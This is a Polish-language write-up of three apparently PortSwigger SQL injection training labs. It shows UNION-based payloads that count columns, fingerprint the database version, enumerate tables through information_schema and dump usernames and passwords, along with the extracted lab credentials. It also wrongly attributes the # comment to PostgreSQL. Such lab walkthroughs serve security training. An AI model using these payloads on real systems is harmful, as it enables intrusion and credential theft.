Laboratorium: Wstrzyknięcie SQL UNION attack, pobieranie wielu wartości w jednej kolumnie

Pierwszym krokiem było określenie liczy kolumn w przechwyconym pakiecie.
``` ' UNION SELECT NULL-- ```
I zwiększamy wartość NULL po przecinku NULL,NULL-- do momętu aż uzyskamy HTTP/2 200 OK 
Następnie jeśli już uskamy tą wartość, musimy dowiedzieć się, która z tych kolumn zawiera tekst, w tym przypadku była to druga kolumna, określiłem to za pomocą ``` ' UNION SELECT NULL,'abc'-- ```
W kolejnym kroku musimy utworzyć zapytanie wiemy, że baza danych zawiera tabelę users z kolumniami username,password. Oto zapytanie.
``` ' UNION SELECT NULL, username || '~' || password FROM users-- ```
Wartość NULL jest tutaj zapisana ponieważ wiemy, że pierwsza tabela nie zawiera tylko druga. dzięki temu zapytaniu uzyskałem zrzut całe bazy danych.
```
                            <th>wiener~xkhstq2rd73ukf1yddjo</th>
                        </tr>
                        <tr>
                            <th>administrator~2nwssjbzicownbljqt8w</th>
                        </tr>
                        <tr>
                            <th>carlos~qvjff1y3mqjqk784v7lc
```

Laboratorium: atak wtryskowy SQL, zapytanie o typ bazy danych i wersję w MySQL i Microsoft

Pierwszym krokiem było określenie liczby kolumn w przechwyconym pakiecie.
``` ' UNION SELECT NULL# ```
Musimy pamiętać, że w różnych bazach danych określa się komentarze zupełnie inaczej.
Poniżej znajduje się pare przykładów, jak komentować:

![obraz](https://github.com/Anogota/PortSwiggger-SQLi/assets/143951834/d6f2c43b-bec8-4207-847f-bf0e923befd8)

W tym przypadku były dwie kolumny.
``` ' UNION SELECT NULL,NULL# ```
Kolejnym krokiem było zidentyfikowane, która kolumna zawiera tekt, ponownie oby dwie zawierały tekst:
``` ' UNION SELECT 'qwe','qwe'# ```
Następnie jeśli już wiemy wszystko wystarczy odgadnąć która baza danych działa na serwerze. Udało mi się dowiedzieć za pomocą tego zapytania:
``` ' UNION SELECT @@version, NULL# ```
Odkryłem również, że działa to ``` ' UNION SELECT version(), NULL# ``` co wydawało mi się bardziej logiczne, ponieważ komentarz # pochodzi od PostgreSQL

Laboratorium: Zaatakowanie wtrysku SQL, wymienianie zawartości bazy danych w bazach danych innych niż Oregon
Pierwszym krokiem było określenie liczby kolumn w przechwyconym pakiecie
``` ' UNION SELECT NULL,NULL-- ```
Dowiedziałem się, że są dwie. Kolejnym krokiem było zidentyfikowane, która kolumna zawiera tekt, ponownie oby dwie zawierały tekst:
``` ' UNION SELECT 'qwe','qwe'-- ```
Następnie jeśli już wiemy wszystko co jest nam potrzebne musimy zrzucić wszystkie nazwy baz danych.
``` ' UNION SELECT table_name, NULL FROM information_schema.tables-- ```
Ujrzałem ciekawą i zarazem nietypową baze danych. ```users_ulaacr```
Następnie musimy zobaczyć jakie kolumny znajdują się w tej bazie danych.
``` ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_ulaacr'-- ```
Dzięki temu dowiedzieliśmy się o dwóch ciekawych kolumnach.
```
username_yiyraf
password_sgsccz
```
Następnie musimy wyodrebnić z nich nazwy użytkowników i hasła:
``` ' UNION SELECT username_yiyraf,password_sgsccz FROM users_ulaacr-- ```
Dzięki temu uzyskaliśmy zrzut haseł i nazw użytkoników
```
carlos
	cj1w2piec8pdfjtp2a76
wiener
	vib0xw0oz6v4y98074s0
administrator
	qo33srs73uxgafa3f08o
```
